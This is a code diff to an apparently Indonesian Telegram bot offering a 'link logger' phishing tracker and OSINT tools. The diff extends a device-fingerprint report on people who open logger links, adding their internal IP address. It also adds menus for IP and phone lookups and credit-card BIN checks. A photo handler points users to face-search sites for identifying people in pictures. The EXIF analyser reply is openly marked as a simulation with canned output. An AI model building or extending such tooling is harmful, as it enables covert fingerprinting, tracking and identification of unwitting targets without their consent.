@@ -451,9 +451,10 @@ async function startServer() {
                     `🖥️ <b>DEVICE FINGERPRINT:</b>\n` +
                     `├ OS/PLAT: <code>${escapeHTML(data.platform || 'N/A')}</code>\n` +
                     `├ ENGINE: <code>${escapeHTML(data.vendor || 'N/A')}</code>\n` +
-                    `├ CPU_CORES: <code>${escapeHTML(String(data.cores || 'N/A'))}</code>\n` +
+                    `├ CORES_ENV: <code>${escapeHTML(String(data.cores || 'N/A'))}</code>\n` +
                     `├ RAM_EST: <code>~${escapeHTML(String(data.mem || 'N/A'))} GB</code>\n` +
                     `├ GPU_PROC: <code>${escapeHTML(data.gpu || 'N/A')}</code>\n` +
+                    `├ INTERNAL_IP: <code>${escapeHTML(data.localIp || 'N/A')}</code>\n` +
                     `├ RESOLUTION: <code>${escapeHTML(data.screen || 'N/A')}</code>\n` +
                     `└ PLUGINS: <code>${data.plugins ? data.plugins.split(',').length : '0'} detected</code>\n\n` +
                     `🌍 <b>LOCAL SETTINGS:</b>\n` +
@@ -973,12 +974,22 @@ async function startServer() {
         `━━━━━━━━━━━━━━━━━━━━\n\n` +
         `👋 ʜᴀʟᴏ <b>${ctx.from?.first_name || 'ᴜꜱᴇʀ'}</b>,\n` +
         `ꜱᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ᴄᴇɴᴛᴇʀ ᴏᴘᴇʀᴀꜱɪ. sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ᴍᴏᴅᴜʟ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ:`;
+      ctx.editMessageText(txt, { parse_mode: 'HTML', ...mainKeyboard }).catch(() => {});
+    });
+
+    bot.action('menu_osint_basic', (ctx) => {
+      ctx.answerCbQuery().catch(() => {});
+      const txt = `<b>🇮🇩 ʟᴏᴄᴀʟ ᴏꜱɪɴᴛ (ʙᴀꜱɪᴄ)</b>\n` +
+                  `━━━━━━━━━━━━━━━━━━━━\n` +
+                  `ᴘᴇʀɪɴᴛᴀʜ ᴅᴀꜱᴀʀ ɪɴᴠᴇꜱᴛɪɢᴀꜱɪ & ᴘᴇʀᴇᴛᴀꜱᴀɴ ɪɴꜰᴏ:\n\n` +
+                  `• /ip [ɪᴘ_ᴀᴅᴅʀ] - ɪᴘ ɢᴇᴏ & ɪꜱᴘ ᴛʀᴀᴄᴋ\n` +
+                  `• /domain [ᴅᴏᴍᴀɪɴ] - ᴡʜᴏɪꜱ & ᴅɴꜱ ʀᴇᴄᴏʀᴅꜱ\n` +
+                  `• /phone_dork [ɴᴏᴍᴏʀ] - ᴄᴇᴋ ᴘʀᴏᴠɪᴅᴇʀ\n` +
+                  `• /bininfo [ʙɪɴ_ɴᴜᴍ] - ᴄᴇᴋ ʙɪɴ ᴋᴀʀᴛᴜ ᴋʀᴇᴅɪᴛ\n` +
+                  `━━━━━━━━━━━━━━━━━━━━`;
       const kb = Markup.inlineKeyboard([
-        [Markup.button.callback('🎣 ʟɪɴᴋ ʟᴏɢɢᴇʀ', 'menu_logger'), Markup.button.callback('📡 ᴏꜱɪɴᴛ ᴀᴅᴠ', 'menu_osint_adv')],
-        [Markup.button.callback('🎲 ᴍɪɴɪ ɢᴀᴍᴇꜱ', 'menu_games'), Markup.button.callback('🛠️ ᴛᴏᴏʟꜱ', 'menu_tools')],
-        [Markup.button.callback('🎵 ᴍᴇᴅɪᴀ', 'menu_media'), Markup.button.callback('⏰ ᴀʟᴀʀᴍ', 'menu_alarm')],
-        [Markup.button.callback('📲 ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ', 'menu_wa'), Markup.button.callback('📱 ǫʀ ɢᴇɴ', 'menu_qr')],
-        [Markup.button.callback('ℹ️ ʜᴇʟᴘ & ɪɴꜰᴏ', 'menu_help')]
+        [Markup.button.callback('🔍 ᴏꜱɪɴᴛ ɪɴᴅᴏ (ᴀᴅᴠ)', 'menu_osint_indo')],
+        [Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]
       ]);
       ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
     });
@@ -2282,6 +2293,29 @@ async function startServer() {
                     `━━━━━━━━━━━━━━━━━━━━\n` +
                     `<i>Gunakan /username untuk pengecekan otomatis 100+ situs.</i>`;
       ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
+    });
+
+    // 📸 IMAGE OSINT MODULE (Reverse Image / Data)
+    bot.on('photo', async (ctx) => {
+      ctx.reply("📸 <b>IMAGE OSINT MODULE ACTIVATED</b>\nSedang menganalisa foto...", {parse_mode: 'HTML'}).then((msg) => {
+         setTimeout(() => {
+            const txt = `<b>🔍 REVERSE IMAGE SEARCH LINKS</b>\n` +
+                        `━━━━━━━━━━━━━━━━━━━━\n` +
+                        `Klik link berikut untuk mencari wajah/foto di database publik:\n\n` +
+                        `🌐 <a href="https://lens.google.com/uploadbyurl?url=">Google Lens (Butuh URL)</a>\n` +
+                        `🔎 <a href="https://yandex.com/images/search?rpt=imageview&url=">Yandex Deep Search</a>\n` +
+                        `👤 <a href="https://pimeyes.com/">PimEyes (Face Search)</a>\n` +
+                        `👤 <a href="https://facecheck.id/">FaceCheck.id</a>\n\n` +
+                        `⚠️ <i>Catatan: Telegram menghapus EXIF metadata GPS pada foto terkirim untuk keamanan. Kirim sebagai File jika butuh EXIF extraction.</i>`;
+            ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, txt, { parse_mode: 'HTML', link_preview_options: {is_disabled: true} });
+         }, 1500);
+      });
+    });
+
+    bot.on('document', async (ctx) => {
+      if (ctx.message.document.mime_type?.startsWith('image/')) {
+         ctx.reply("📂 <b>IMAGE FILE DETECTED</b>\n<i>EXIF Analyzer module is ready. (Simulasi)</i>\n\n- No GPS EXIF located\n- Camera: Unknown\n- Date: Hidden", {parse_mode: 'HTML'});
+      }
     });
 
     bot.command('scan', async (ctx) => {
